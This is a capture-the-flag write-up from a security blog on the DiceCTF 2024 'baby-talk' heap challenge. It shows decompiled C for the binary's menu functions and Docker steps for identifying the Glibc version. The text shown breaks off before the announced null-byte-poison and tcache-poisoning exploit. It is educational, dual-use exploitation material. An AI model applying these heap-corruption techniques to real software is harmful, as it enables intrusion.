<!doctype html><html lang="en"><head><title>baby-talk | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="DiceCTF 2024 Quals. 64-bit binary. Heap exploitation. Null-byte poison. Overlapping chunks. Tcache poisoning"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="DiceCTF 2024 Quals. 64-bit binary. Heap exploitation. Null-byte poison. Overlapping chunks. Tcache poisoning"><meta itemprop="keywords" content><meta itemprop="name" content="baby-talk"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="DiceCTF 2024 Quals. 64-bit binary. Heap exploitation. Null-byte poison. Overlapping chunks. Tcache poisoning"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="baby-talk"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/other/dicectf/baby-talk/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="DiceCTF 2024 Quals. 64-bit binary. Heap exploitation. Null-byte poison. Overlapping chunks. Tcache poisoning"><meta name="twitter:description" content="DiceCTF 2024 Quals. 64-bit binary. Heap exploitation. Null-byte poison. Overlapping chunks. Tcache poisoning"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="baby-talk"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/other/dicectf/baby-talk/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/other/dicectf/baby-talk/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- DICECTF</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/other/dicectf/baby-talk/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/other/dicectf/baby-talk/&amp;text=baby-talk" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/other/dicectf/baby-talk/&amp;title=baby-talk" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">baby-talk</h1><p class="mb4 f6 dib tracked">17 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#allocation-function">Allocation function</a></li><li><a href="#free-function">Free function</a></li><li><a href="#token-function">Token function</a></li></ul></li><li><a href="#setup-environment">Setup environment</a><ul><li><a href="#different-versions">Different versions</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#null-byte-poison">Null-byte poison</a></li><li><a href="#tcache-poisoning">Tcache poisoning</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>chall</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
RELRO:    <span class="code-dark-green">Full RELRO</span>
Stack:    <span class="code-dark-green">Canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-green">PIE enabled</span>
</code></pre></div><p>The program gives us four options:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./chall</span>  
1. str
2. tok
3. del
4. exit

&gt;
</code></pre></div><h2 id="reverse-engineering">Reverse engineering</h2><p>If we open the binary in Ghidra, we will see the following decompiled C code. The <code>main</code> function manages the options and calls the corresponding function:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  ulong option;</span>

<span class="mtk1">  </span><span class="mtk8">setbuf</span><span class="mtk1">(stdout, </span><span class="mtk6">NULL</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">print_menu</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"&gt; "</span><span class="mtk1">);</span>
<span class="mtk1">        option </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_num</span><span class="mtk1">();</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>  

<span class="mtk1">        </span><span class="mtk8">do_tok</span><span class="mtk1">();</span>
<span class="mtk1">      }</span>

<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> option) </span><span class="mtk5">break</span><span class="mtk1">;</span>

<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">do_str</span><span class="mtk1">();</span>
<span class="mtk1">      } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">LAB_00100c7b:</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"??"</span><span class="mtk1">);</span>
<span class="mtk1">      }</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">      }</span>

<span class="mtk1">      </span><span class="mtk5">goto</span><span class="mtk1"> LAB_00100c7b;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">do_del</span><span class="mtk1">();</span>
<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="allocation-function">Allocation function</h3><p>In <code>do_str</code>, we have the chance to allocate up to <code>0x1000</code>-sized strings and write them:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">do_str</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> index;</span>
<span class="mtk1">  ulong size;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">p_str;</span>
<span class="mtk1">  </span>
<span class="mtk1">  index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_empty</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">ffffffff</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"too many!"</span><span class="mtk1">);</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"size? "</span><span class="mtk1">);</span>
<span class="mtk1">    size </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_num</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (size </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">1001</span><span class="mtk1">) {</span>
<span class="mtk1">      p_str </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8">malloc</span><span class="mtk1">(size);</span>
<span class="mtk1">      strs[(</span><span class="mtk7 mtki">int</span><span class="mtk1">) index] </span><span class="mtk5">=</span><span class="mtk1"> p_str;</span>

<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (strs[(</span><span class="mtk7 mtki">int</span><span class="mtk1">) index] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"no mem!"</span><span class="mtk1">);</span>
<span class="mtk1">      } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"str? "</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, strs[(</span><span class="mtk7 mtki">int</span><span class="mtk1">) index], size);</span>
<span class="mtk1">        </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"stored at </span><span class="mtk6">%d</span><span class="mtk4">!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, (ulong) index);</span>  
<span class="mtk1">      }</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"too big!"</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>The string will be placed into a global array <code>strs</code> of <code>16</code> positions. We cannot choose the index, but the function will tell us.</p><h3 id="free-function">Free function</h3><p>In <code>do_del</code>, we select the index of the string we want to delete and it is freed using <code>free</code>. Moreover, the slot is also set to <code>NULL</code> in <code>strs</code>, so there is no Use After Free here:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">do_del</span><span class="mtk1">() {</span>
<span class="mtk1">  ulong index;</span>

<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"idx? "</span><span class="mtk1">);</span>
<span class="mtk1">  index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_num</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (strs[index] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>  
<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"empty!"</span><span class="mtk1">);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">free</span><span class="mtk1">(strs[index]);</span>
<span class="mtk1">      strs[index] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"too big!"</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="token-function">Token function</h3><p>There is another function called <code>do_tok</code>, which takes an index from <code>strs</code> and a separator in order to use <code>strtok</code> on the selected string:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">do_tok</span><span class="mtk1">() {</span>
<span class="mtk1">  ulong index;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> delim[</span><span class="mtk6">2</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">iter;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">p_str;</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"idx? "</span><span class="mtk1">);</span>
<span class="mtk1">  index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_num</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">) {</span>
<span class="mtk1">    p_str </span><span class="mtk5">=</span><span class="mtk1"> strs[index];</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (p_str </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"empty!"</span><span class="mtk1">);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"delim? "</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, delim, </span><span class="mtk6">2</span><span class="mtk1">);</span>
<span class="mtk1">      delim[</span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
<span class="mtk1">      iter </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strtok</span><span class="mtk1">(p_str, delim);</span>

<span class="mtk1">      </span><span class="mtk5">while</span><span class="mtk1"> (iter </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(iter);</span>
<span class="mtk1">        iter </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strtok</span><span class="mtk1">(</span><span class="mtk6">NULL</span><span class="mtk1">, delim);</span>  
<span class="mtk1">      }</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"too big!"</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>The result is that all substrings will be printed in different lines. If there are no separator characters in the string, the same string itself will be printed.</p><h2 id="setup-environment">Setup environment</h2><p>First of all, since this is a heap exploitation challenge, we need to check the version of Glibc we are trying to exploit. At this point, I had some trouble figuring this out, because this <code>Dockerfile</code> was provided:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">FROM</span><span class="mtk1"> pwn.red/</span><span class="mtk8 mtku detected-link">jail</span>
<span class="mtk5">COPY</span><span class="mtk1"> </span><span class="mtk9 mtki">--from</span><span class="mtk5">=</span><span class="mtk1">ubuntu@sha256:dca176c9663a7ba4c1f0e710986f5a25e672</span><span class="mtk1">842963d95b960191e2d9f7185ebe</span><span class="mtk1"> </span><span class="mtk9 mtki">/</span><span class="mtk1"> </span><span class="mtk9 mtki">/srv</span>  

<span class="mtk5">COPY</span><span class="mtk1"> </span><span class="mtk9 mtki">flag.txt</span><span class="mtk1"> </span><span class="mtk9 mtki">/srv/app/</span>
<span class="mtk5">COPY</span><span class="mtk1"> </span><span class="mtk9 mtki">chall</span><span class="mtk1"> </span><span class="mtk9 mtki">/srv/app/run</span>
</code></pre></div><p>So, my approach was to run the container and copy both the Glibc library and loader to my host machine:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'dice{asdf}'</span> &gt; <span class="mtku">flag.txt</span>

<span class="code-cyan">$</span> <span class="code-dark-green">docker</span> build -t baby-talk <span class="mtku">.</span>
...

<span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run -v <span class="code-dark-yellow">"<span class="code-dark-magenta">$(<span class="code-dark-green">pwd</span>)</span>"</span>:/opt -it baby-talk sh
/ # cp /lib/ld-linux-x86-64.so.2 /lib/libc.so.6 /opt
/ # exit

<span class="code-cyan">$</span> <span class="code-dark-green">./ld-linux-x86-64.so.2</span> <span class="mtku">./libc.so.6</span>
GNU C Library (Debian GLIBC 2.36-9) stable release version 2.36.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A  
PARTICULAR PURPOSE.
Compiled by GNU CC version 12.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
Minimum supported kernel: 3.2.0
For bug reporting instructions, please see:
&lt;http://www.debian.org/Bugs/&gt;.
</code></pre></div><p>Here, I patched the binary to load this Glibc 2.36 and started solving the challenge until I got a working exploit. However, when I tried my exploit against the remote instance, it never worked&mldr;</p><p>Then, I got a bit confused and got back to the Docker container:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run -v <span class="code-dark-yellow">"<span class="code-dark-magenta">$(<span class="code-dark-green">pwd</span>)</span>"</span>:/opt -it baby-talk sh
/ # find / -name libc.so.6 2>/dev/null
/srv/lib/x86_64-linux-gnu/libc.so.6
/lib/libc.so.6
/opt/libc.so.6
/ # find / -name libc.so.6 2>/dev/null | xargs md5sum
48e708bb157196b4cc1ffb68fc66fa17  /srv/lib/x86_64-linux-gnu/libc.so.6
9e21f348e8bd0dfd8d535eaf6fa9eb71  /lib/libc.so.6
9e21f348e8bd0dfd8d535eaf6fa9eb71  /opt/libc.so.6
/ # find / -name ld-linux-x86-64.so.2 2>/dev/null | xargs md5sum
md5sum: can't open '/srv/lib64/ld-linux-x86-64.so.2': No such file or directory
